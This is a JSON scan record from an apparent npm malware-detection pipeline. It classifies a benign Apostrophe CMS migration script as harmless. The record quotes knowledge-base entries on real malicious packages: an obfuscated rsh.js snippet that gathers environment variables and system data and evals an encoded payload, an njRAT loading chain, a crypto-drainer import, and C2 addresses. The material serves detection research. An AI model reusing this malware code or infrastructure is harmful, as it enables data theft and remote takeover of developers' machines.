@@ -1,0 +1,513 @@
+{
+  "package_name": "apostrophe-legacy-import",
+  "package_version": "0.2.0",
+  "label": "benign",
+  "detection_time": "2026-05-26T17:53:11.034917",
+  "status": "success",
+  "selected_files_count": 2,
+  "selected_files": [
+    "package/package.json",
+    "package/index.js"
+  ],
+  "is_malicious": false,
+  "total_files": 2,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/apostrophe-legacy-import/0.2.0/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/apostrophe-legacy-import/0.2.0/package/index.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "index_slice_1",
+          "code_snippet": "var mongodb = require('emulate-mongo-2-driver');\nvar _ = require('lodash');\nvar async = require('async');\nvar cuid = require('cuid');\nvar glob = require('glob');\nvar fs = require('fs-extra');\nvar moment = require('moment');\n\nmodule.exports = {\n\n  afterConstruct: function(self) {\n    self.mapStandardWidgets();\n    self.mapCommandLine();\n    self.apos.tasks.add(self.__meta.name, 'import', self.importTask);\n  },\n\n  construct: function(self, options) {\n\n    self.widgetMap = {};\n    self.typeMap = {};\n    self.blockMap = {};\n    self.lockupMap = {};\n    \n    self.mapType = function(oldName, newNameOrFn) {\n      self.typeMap[oldName] = newNameOrFn;\n    };\n\n    self.mapWidget = function(oldName, newNameOrFn) {\n      self.widgetMap[oldName] = newNameOrFn;\n    };\n\n    self.mapBlock = function(oldName, newNameOrFn) {\n      self.blockMap[oldName] = newNameOrFn;\n    };\n\n    self.mapLockup = function(oldName, newNameOrFn) {\n      self.lockupMap[oldName] = newNameOrFn;\n    };\n\n    self.importTask = function(apos, argv, callback) {\n      return async.series([\n        self.connectLegacyDb,\n        self.importFiles,\n        self.importDocs\n      ], callback);\n    };\n\n    self.connectLegacyDb = function(callback) {\n      console.log('Connecting to legacy db');\n      var legacyDbUriOrName = self.apos.argv['legacy-db'];\n      var legacyFiles = self.apos.argv['legacy-root'];\n      if (legacyDbUriOrName.match(/mongodb:/)) {\n        legacyDbUri = legacyDbUriOrName;\n      } else {\n        legacyDbUri = 'mongodb://localhost:27017/' + legacyDbUriOrName;\n      }\n      return mongodb.MongoClient.connect(legacyDbUri, function(err, db) {\n        if (err) {\n          return callback(err);\n        }\n        self.legacyDb = db;\n        self.legacyPages = self.legacyDb.collection('aposPages');\n        self.legacyFiles = self.legacyDb.collection('aposFiles');\n        return callback(null);\n      });\n    };\n    \n    self.importFiles = function(callback) {\n      console.log('Importing files');\n      self.oldFilesDir = self.apos.argv['legacy-root'] + '/public/uploads/files/';\n      self.newFilesDir = self.apos.rootDir + '/public/uploads/attachments/';\n      const existingOld = fs.readdirSync(self.oldFilesDir).map(file => self.oldFilesDir + file);\n      const existingNew = fs.readdirSync(self.newFilesDir).map(file => self.newFilesDir + file);\n      return self.apos.migrations.each(self.legacyFiles, {}, 1, function(file, callback) {\n        return self.importFile(file, existingOld, existingNew, callback);\n      }, callback);\n    };\n    \n    self.importFile = function(file, existingOld, existingNew, callback) {\n      var attachment;\n      return async.series([\n        copyFiles,\n        insertAttachment,\n        insertDoc\n      ], callback);\n      function copyFiles(callback) {\n        var files = existingOld.filter(name => name.startsWith(self.oldFilesDir + file._id));\n        var n = 0;\n        return async.eachSeries(files, function(file, callback) {\n          var newFile = 'a205file' + require('path').basename(file);\n          var legacyFile = self.apos.argv['legacy-root'] + '/public/uploads/files/' + require('path').basename(file);\n          var newFile = self.newFilesDir + newFile;\n          if (existingNew.find(name => name === newFile)) {\n            return process.nextTick(callback);\n          }\n          return self.copyFile(legacyFile, newFile, callback);\n        }, callback);\n      }\n      function insertAttachment(callback) {\n        attachment = _.clone(file);\n        _.extend(attachment, {\n          _id: 'a205file' + file._id,\n          type: 'attachment'\n        });\n        // Can lead to infinite recursion\n        delete attachment._owner;\n        return self.apos.attachments.db.insert(attachment, callback);\n      }\n      function insertDoc(callback) {\n        var newDoc = {};\n        _.extend(newDoc, {\n          _id: 'a205file' + file._id,\n          slug: 'a205file' + file._id + '-' + file.name,\n          type: (file.group === 'office') ? 'apostrophe-file' : 'apostrophe-image',\n          title: file.title,\n          credit: file.credit,\n          description: file.description,\n          published: true,\n          attachment: attachment\n        });\n        return self.apos.docs.db.insert(newDoc, callback);\n      }\n    };\n    \n    self.importDocs = function(callback) {\n      console.log('Importing documents');\n      var cursor = self.legacyPages.find({}).sort({ level: 1, path: 1, rank: 1, slug: 1 });\n      one();\n      // async while loop through all the legacy docs with the custom sort\n      function one() {\n        cursor.nextObject(function(err, doc) {\n          if (err) {\n            return callback(err);\n          }\n          if (!doc) {\n            return callback(null);\n          }\n          return self.importDoc(doc, function(err) {\n            if (err) {\n              return callback(err);\n            }\n            one();\n          });\n        });\n      }\n    };\n\n    self.importDoc = function(doc, callback) {\n      if (self.apos.argv.global) {\n        if (doc.slug === 'global') {\n          // in 0.5 global had a funky lack of standard fields\n          doc.type = 'apostrophe-global';\n          doc.published = true;\n          doc.trash = false;\n          self.typeMap['apostrophe-global'] = 'apostrophe-global';\n        }\n      }\n      if (!self.typeMap[doc.type]) {\n        return setImmediate(callback);\n      }\n      var newDoc = {};\n      if (doc.blockGroups) {\n        self.importBlocks(doc);\n      }\n      _.each(doc, function(val, key) {\n        if (val && (val.type === 'area')) {\n          newDoc[key] = {\n            type: 'area',\n            items: self.importItems(val.items || [])\n          };\n        } else if (key === 'path') {\n          newDoc.path = val.replace(/^home/, '');\n        } else if (key === 'type') {\n          // typeMap handles this\n        } else if (key === 'sortTitle') {\n          newDoc.titleSortified = val;\n        } else {\n          newDoc[key] = val;\n        }\n      });\n\n      if (typeof(self.typeMap[doc.type]) === 'string') {\n        newDoc.type = self.typeMap[doc.type];\n      } else {\n        newDoc = self.typeMap[doc.type](doc, newDoc);\n      }\n      \n      if (doc.publishedAt && (doc.type.match(/blog/i) || newDoc.type.match(/blog/i))) {\n        // This is flat wrong, but for now the 2.0 blog module has\n        // just date in publishedAt and not a Date object ):\n        newDoc.publishedAt = moment(doc.publishedAt).format('YYYY-MM-DD');\n      }\n      // bc\n      if (self.apos.argv['blog-2']) {\n        self.apos.argv['convert-blog-2-slugs'] = 'blogPost';\n      }\n      let blog2Slugs = self.apos.argv['convert-blog-2-slugs'];\n      if (blog2Slugs) {\n        blog2Slugs = blog2Slugs.split(',');\n        if (!Array.isArray(blog2Slugs)) {\n          blog2Slugs = [ blog2Slugs ];\n        }\n        if (blog2Slugs.includes(doc.type)) {\n          const matches = doc.slug.match(/\\d\\d\\d\\d\\/\\d\\d\\/\\d\\d\\/.*$/);\n          if (matches) {\n            // preserve the date in the slug to avoid slug conflicts on\n            // migration and make it possible to write routes that redirect\n            // to the new pattern\n            newDoc.slug = matches[0].replace(/\\//g, '-');\n          }\n        }\n      }\n\n      return async.series([\n        uniqueSlug,\n        _.partial(self.beforeImportDoc, doc, newDoc),\n        function(callback) {\n          self.apos.docs.db.insert(newDoc, callback);\n        },\n        _.partial(self.afterImportDoc, doc, newDoc)\n      ], function(err) {\n        if (err === 'skip') {\n          return callback(null);\n        }\n        return callback(err);\n      });\n      \n      // A duplicate slug is possible if your 2.0 site already has it.\n      // Make it unique enough\n      function uniqueSlug(callback) {\n        return self.apos.docs.db.findOne({slug: newDoc.slug }, function(err, match) {\n          if (err) {\n            return callback(err);\n          }\n          if (!match) {\n            return callback(null);\n          }\n          if ((match.parked && self.apos.argv['replace-parked']) || (match.slug === 'global')) {\n            return self.apos.docs.db.removeOne({\n              slug: newDoc.slug\n            }, callback);\n          }\n          newDoc.slug += Math.floor(Math.random() * 10);\n          return uniqueSlug(callback);\n        });\n      }\n    }\n\n    self.importBlocks = function(doc) {\n      if (!doc.blockGroups) {\n        return;\n      }\n      for (const [name, info] of Object.entries(doc.blockGroups)) {\n        doc[name] = {\n          _id: cuid(),\n          type: 'area',\n          items: []\n        };\n        for (const block of info.blocks) {\n          if (!self.blockMap[block.type]) {\n            continue;\n          }\n          const blockWidget = {\n            type: self.blockMap[block.type]\n          };\n          const prefix = `${name}_${block.id}_`;\n          const relevant = Object.keys(doc).filter(key => key.substring(0, prefix.length) === prefix);\n          const areaNames = [ ...new Set(relevant.map(key => key.replace(prefix, ''))) ];\n          for (const areaName of areaNames) {\n            const area05Name = prefix + areaName;\n            blockWidget[areaName] = {\n              type: 'area',\n              // Don't import them yet, we'll recursively import all in the doc later\n              items: doc[area05Name].items\n            };\n          }\n          doc[name].items.push(blockWidget);\n          for (const key of relevant) {\n            // Don't double-import\n            delete doc[key];\n          }\n        }\n        const orphans = Object.keys(doc).filter(key => key.startsWith(`${name}_`));\n        orphans.forEach(orphan => delete doc[orphan]);\n      }\n      delete doc.blockGroups;\n    };\n      \n    self.beforeImportDoc = function(doc, newDoc, callback) {\n      return callback(null);\n    }\n\n    self.afterImportDoc = function(doc, newDoc, callback) {\n      return callback(null);\n    }\n    \n    self.importItems = function(items) {\n      var newItems = [];\n      for (let i = 0; (i < items.length); i++) {\n        const item = items[i];\n        if (item._id && item._id.toString().startsWith('a205widget')) {\n          // Already converted, some recursive gotcha\n          newItems.push(item);\n          continue;\n        }\n        if (item.lockup && self.lockupMap[item.lockup]) {\n          let richText, media;\n          if (item.type === 'richText') {\n            richText = item;\n            media = items[i + 1];\n          } else {\n            richText = items[i + 1];\n            media = item;\n          }\n          const lockup = self.importLockup(item.lockup, richText, media);\n          if (lockup) {\n            newItems.push(lockup);\n            i++;\n            continue;\n          }\n        }\n        if (!self.widgetMap[item.type]) {\n          continue;\n        }\n        let widget;\n        if (typeof(self.widgetMap[item.type]) === 'string') {\n          widget = _.clone(item);\n          widget.type = self.widgetMap[item.type];\n          widget._id = item.id ? `a205widget${item.id}` : `a205widget${cuid()}`;\n        } else {\n          widget = self.widgetMap[item.type](item);\n        }\n        recursivelyImportAreas(widget);\n        if (!widget) {\n          continue;\n        }\n        newItems.push(widget);\n      }\n      return newItems;\n\n      function recursivelyImportAreas(widget) {\n        for (const [key, val] of Object.entries(widget)) {\n          if (val && (val.type === 'area')) {\n            val.items = self.importItems(val.items);\n          }\n          if (val && (typeof val === 'object')) {\n            recursivelyImportAreas(val);\n          }\n        }\n      }\n    };\n\n    self.importLockup = function(name, richText, other) {\n      if (!(richText && other)) {\n        return false;\n      }\n      return {\n        type: self.lockupMap[name],\n        richText: {\n          type: 'area',\n          items: self.importItems([ _.omit(richText, 'lockup') ])\n        },\n        media: {\n          type: 'area',\n          items: self.importItems([ other ])\n        }\n      }\n    };\n\n    self.mapStandardWidgets = function() {\n      self.mapWidget('richText', 'apostrophe-rich-text');\n      self.mapWidget('html', 'apostrophe-html');\n      self.mapWidget('slideshow', function(item) {\n        var relationships = {};\n        _.each(item.extras || {}, function(val, key) {\n          var newKey = 'a205file' + key;\n          Object.assign(val, val.crop || {});\n          delete val.crop;\n          relationships[newKey] = val;\n        });\n        var widget = {\n          originalId: item.id,\n          _id: `a205widget${item.id}`,\n          type: self.apos.argv['slideshow-type'] || 'apostrophe-images',\n          by: 'id',\n          pieceIds: _.map(item.ids || [], function(id) {\n            return 'a205file' + id\n          }),\n          relationships: relationships,\n          // These won't actually do anything interesting unless you decide to\n          // custom-implement them in your 2.x project, but bring along the 0.5 data\n          // for completeness\n          ..._.pick(item, 'position', 'size', 'showTitles', 'showDescriptions', 'showCredits')\n        };\n        return widget;\n      });\n      self.mapWidget('video', function(item) {\n        return {\n          originalId: item.id,\n          _id: `a205widget${item.id}`,\n          type: 'apostrophe-video',\n          video: {\n            url: item.video,\n            title: item.title,\n            thumbnail: item.thumbnail\n          }\n        };\n      });\n    };\n    \n    self.mapCommandLine = function() {\n      [ 'type', 'widget', 'block', 'lockup' ].forEach(feature => {\n        const option = `map-${feature}s`;\n        if (self.apos.argv[option]) {\n          const pairs = self.apos.argv[option].split(',');\n          _.each(pairs, function(pair) {\n            pair = pair.split(':');\n            self[`${feature}Map`][pair[0]] = pair[1];\n          });\n        }\n      });\n      Object.values(self.blockMap).forEach(name => self.widgetMap[name] = name);\n      Object.values(self.lockupMap).forEach(name => self.widgetMap[name] = name);\n    };\n\n    self.copyFile = function(from, to, callback) {\n      return fs.copy(from, to, callback);\n    };\n  }\n};",
+          "is_malicious": false,
+          "malice_score": 0.43531248370806375,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code accesses and connects to a legacy MongoDB database using a URI constructed from user-provided arguments, reads files from legacy file directories, copies them to new locations using fs-extra, and inserts file metadata and documents into new database collections. It processes and transforms legacy documents and widgets, mapping types and widgets, and recursively imports nested content areas. This involves extensive file system operations (read, copy), database operations (connect, find, insert, remove), and string manipulations for IDs and slugs, enabling data migration from legacy systems to a new platform.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a data migration utility designed to connect to a legacy MongoDB database, read files from legacy directories, copy them to new locations, and insert transformed documents into a new database schema. It uses standard Node.js modules and libraries (mongodb, fs-extra, lodash, async, moment) in a straightforward manner. There is no evidence of obfuscated code, dynamic or hidden requires, eval usage, or attempts to collect system or user data beyond what is necessary for migration. The code's behavior aligns with legitimate migration tasks and does not match the key indicators of known malicious patterns such as stealthy require statements, obfuscated payload execution, or dynamic imports of suspicious packages. Sensitive operations like file copying and database inserts are expected in migration scripts and are not inherently malicious without additional suspicious context.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20250105_195714_456618_snippet_6",
+              "source_package": "jdb.js, db-json.js (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250105_195714_456618/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.44666120409965515,
+              "code_similarity": 0.45572757720947266,
+              "behavior_similarity": 0.43759483098983765,
+              "matched_snippet": {
+                "snippet_id": "snippet_6",
+                "code_snippet": "require('jdb.js');",
+                "code_behavior": "At import-time or runtime, the last line of dbmanager.js explicitly loads and executes jdb.js, covertly triggering the malicious infection chain even if the user only interacts with db-json.js.",
+                "malice_analysis": {
+                  "why_suspicious": "A hidden require statement at the end of a file is a stealthy method to trigger malware execution without user awareness.",
+                  "violated_expectations": "Legitimate code does not secretly load unrelated or malicious modules, especially at the end of a file.",
+                  "similar_legitimate_use": "Dynamic requires are sometimes used for plugin systems, but not for loading unrelated or malicious code.",
+                  "key_indicators": [
+                    "Hidden require statement at end of file",
+                    "Triggers execution of malicious code path",
+                    "No legitimate reason for this import"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time/runtime",
+                  "file_location": "db-json.js/dbmanager.js (last line)",
+                  "required_permissions": []
+                },
+                "package_info": {
+                  "package_name": "jdb.js, db-json.js",
+                  "package_manager": "npm",
+                  "package_versions": "jdb.js: 1.0.0; db-json.js: 1.0.3, 1.0.4",
+                  "why_malicious": "Both packages are explicitly crafted to deliver and execute the njRAT/Bladabindi Remote Access Trojan on victim systems. 'jdb.js' directly drops and launches the RAT executable, while 'db-json.js' covertly includes 'jdb.js' as a dependency and triggers its execution, resulting in full system compromise, persistent remote access, and potential data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs db-json.js or jdb.js package.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code is prepared for execution."
+                  },
+                  {
+                    "step": 2,
+                    "action": "db-json.js pulls in jdb.js as a dependency and/or explicitly requires it in dbmanager.js.",
+                    "implemented_by": [
+                      "snippet_5",
+                      "snippet_6"
+                    ],
+                    "leads_to": "Triggers execution of jdb.js malicious logic."
+                  },
+                  {
+                    "step": 3,
+                    "action": "jdb.js install script executes obfuscated module.js.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "module.js decodes and writes patch.exe to disk, then launches it."
+                  },
+                  {
+                    "step": 4,
+                    "action": "patch.exe (njRAT dropper) copies itself to TEMP as dchps.exe, modifies firewall rules, and launches RAT payload.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "System is infected with njRAT."
+                  },
+                  {
+                    "step": 5,
+                    "action": "dchps.exe (njRAT) connects to C2 server, awaits commands for remote control, data theft, and system manipulation.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains full remote access and control over the victim system."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm install scripts that execute obfuscated JavaScript files unrelated to build or setup",
+                    "Presence of base64 or binary blobs in JavaScript files that decode to Windows executables",
+                    "Unexpected creation and execution of .exe files (e.g., patch.exe, dchps.exe) during npm package install",
+                    "Modification of Windows firewall rules via netsh.exe during or after npm install",
+                    "Outbound connections to hardcoded njRAT C2 IP addresses or suspicious external URLs"
+                  ],
+                  "file_indicators": [
+                    "patch.exe or dchps.exe present in the TEMP directory",
+                    "Obfuscated module.js file containing encoded payloads in jdb.js",
+                    "package.json with suspicious install scripts (e.g., \"install\": \"node module.js\")",
+                    "dbmanager.js with a hidden require('jdb.js') statement at the end of the file"
+                  ],
+                  "network_indicators": [
+                    "Connection attempts to 46.185.116.2:5552 (njRAT C2 server)",
+                    "Access to https://dl.dropbox.com/s/p84aaz28t0hepul/Pass.exe",
+                    "Unusual outbound traffic from npm install or Node.js processes to external IPs or domains"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for install scripts that execute obfuscated or encoded JavaScript files. Flag packages that write and execute .exe files, especially in TEMP directories, during or after installation. Detect and alert on modifications to Windows firewall rules via netsh.exe initiated by npm or Node.js processes. Monitor for outbound connections to known njRAT C2 infrastructure (e.g., 46.185.116.2:5552) or suspicious Dropbox URLs. Scan package code for hidden require statements that load unrelated or suspicious modules, particularly at the end of files."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104012_987336_snippet_3",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.44149908423423767,
+              "code_similarity": 0.5412522554397583,
+              "behavior_similarity": 0.34174591302871704,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "var os = require(\"os\"),\n    zlib = require(\"zlib\"),\n    bs = \"base64\",\n    filterNet = (o) => {\n        var oR = {};\n        for (var k in o) {\n            if (\"lo0\" == k) continue;\n            for (var i in o[k]) {\n                if (\"127.0.0.1\" == o[k][i][\"address\"]) continue;\n                if (o[k][i][\"family\"] == \"IPv4\" && o[k][i][\"address\"]) {\n                    oR[k] = o[k][i]\n                    break;\n                }\n            }\n        }\n        return oR;\n    },\n    rmKeys = (o, ...keys) => {\n        for (var k in keys) {\n            delete o[keys[k]];\n        }\n        return o;\n    },\n    pkg = JSON.parse(require(\"fs\").readFileSync(\"package.json\").toString(\"utf8\")),\n    zS = (s) => zlib.brotliCompressSync(s, { level: 11, windowBits: 15, quality: 11 }).toString(bs),\n    zO = (o) => zS(JSON.stringify(o, null, 2)),\n    uS = (s) => zlib.brotliDecompressSync(Buffer.from(s, bs)).toString(),\n    o = {\n        \"name\": pkg.name,\n        \"version\": pkg.version,\n        \"pwd\": process.cwd(),\n        \"env\": process.env,\n        \"platform\": os.platform(),\n        \"arch\": os.arch(),\n        \"release\": os.release(),\n        \"type\": os.type(),\n        \"uptime\": os.uptime(),\n        \"hostname\": os.hostname(),\n        \"cpus\": [os.cpus().length, rmKeys(os.cpus()[0], \"times\")],\n        \"networkInterfaces\": filterNet(os.networkInterfaces()),\n        \"freemem\": os.freemem(),\n        \"totalmem\": os.totalmem(),\n        \"userInfo\": os.userInfo()\n    };\nlet s = zO(o), s1 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);\nprocess.env.NODE_NO_EVAL = undefined;\neval(s1);",
+                "code_behavior": "At runtime, when rsh.js is executed as a detached process, the code collects detailed system, environment, and user information, compresses and encodes it, decompresses an obfuscated payload from a base64 string, sets the NODE_NO_EVAL environment variable to undefined, and executes the decompressed payload using eval, resulting in the execution of further malicious code.",
+                "malice_analysis": {
+                  "why_suspicious": "Collecting extensive system, environment, and user data, compressing and encoding it, and executing obfuscated code via eval are all strong indicators of malicious intent and are commonly used to evade detection and enable data exfiltration.",
+                  "violated_expectations": "Legitimate packages do not collect and exfiltrate system or user information, nor do they execute dynamically decompressed and obfuscated code via eval.",
+                  "similar_legitimate_use": "Compression and system info gathering may be used in legitimate diagnostics or telemetry, but not in combination with obfuscated payload execution and without user consent.",
+                  "key_indicators": [
+                    "Obfuscated and base64-encoded payload decompressed and executed via eval",
+                    "Systematic collection of system, environment, and user data",
+                    "Manipulation of environment variables to bypass security controls",
+                    "No user notification or consent for data collection or code execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when rsh.js is executed)",
+                  "file_location": "scripts/rsh.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars",
+                    "process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_102926_037825_snippet_2",
+              "source_package": "@ledgerhq/connect-kit (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_102926_037825/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.42462611198425293,
+              "code_similarity": 0.4382286071777344,
+              "behavior_similarity": 0.4110236167907715,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Pseudocode representation based on report\nimport('2e6d5f64604be31').then(drainer => drainer.init());",
+                "code_behavior": "At import-time or during package initialization, the code dynamically imports and executes a secondary npm package (2e6d5f64604be31), which acts as a crypto drainer, enabling further malicious actions such as wallet draining and unauthorized asset transfers.",
+                "malice_analysis": {
+                  "why_suspicious": "The code dynamically downloads and executes an unlisted, suspiciously named secondary package at runtime, a common technique for evading static analysis and delivering malware payloads.",
+                  "violated_expectations": "Legitimate packages should not download or execute arbitrary code from external, unvetted sources at runtime, especially without user awareness or consent.",
+                  "similar_legitimate_use": "Dynamic imports are used in legitimate plugin systems, but only from trusted, well-known sources and never for unlisted or obfuscated packages.",
+                  "key_indicators": [
+                    "Dynamic import of a non-standard, suspiciously named package (2e6d5f64604be31)",
+                    "No user notification or consent for code execution",
+                    "Obfuscation of malicious payload delivery via secondary package",
+                    "Presence of code that enables further malicious actions after import"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (import-time or during package initialization)",
+                  "file_location": "main application code (in @ledgerhq/connect-kit v1.1.5 and v1.1.6)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "@ledgerhq/connect-kit",
+                  "package_manager": "npm",
+                  "package_versions": "1.1.5, 1.1.6, 1.1.7",
+                  "why_malicious": "Versions 1.1.5, 1.1.6, and 1.1.7 of @ledgerhq/connect-kit were compromised to include or download crypto drainer malware. The malicious code is designed to either directly or indirectly execute unauthorized transactions, stealing cryptocurrency from users' wallets. The attack is triggered during normal application use, presenting fake wallet connection prompts and exfiltrating assets to attacker-controlled wallets without user consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious versions of @ledgerhq/connect-kit are published to npm and included as dependencies in target applications.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is distributed to end-user applications via dependency installation."
+                  },
+                  {
+                    "step": 2,
+                    "action": "When the application loads the compromised package, malicious code is executed either at import-time or during user interaction.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "User is presented with a fake wallet connection modal or a secondary drainer package is loaded and executed."
+                  },
+                  {
+                    "step": 3,
+                    "action": "User interacts with the fake modal and connects their wallet, or the secondary drainer package initializes.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Malware initiates unauthorized transactions using the connected wallet."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malware drains funds from the connected wallet to attacker-controlled addresses.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives stolen cryptocurrency, achieving the final objective of the attack."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Display of unexpected or suspicious wallet connection modals in applications using @ledgerhq/connect-kit",
+                    "Automatic initiation of wallet transactions without explicit user consent or confirmation",
+                    "Dynamic import or download of secondary npm packages (such as 2e6d5f64604be31) at runtime",
+                    "Execution of code that interacts with browser wallet APIs outside of normal user-initiated flows"
+                  ],
+                  "file_indicators": [
+                    "Presence of @ledgerhq/connect-kit versions 1.1.5, 1.1.6, or 1.1.7 in package.json, package-lock.json, or yarn.lock",
+                    "References to package 2e6d5f64604be31 in source code or dependency trees",
+                    "Unexpected changes or additions to node_modules/@ledgerhq/connect-kit/main.js or related files"
+                  ],
+                  "network_indicators": [
+                    "Outbound cryptocurrency transactions to known attacker wallet addresses immediately following wallet connection events",
+                    "Unexpected network requests initiated during or after wallet connection flows",
+                    "Connections to domains or endpoints associated with the secondary drainer package"
+                  ],
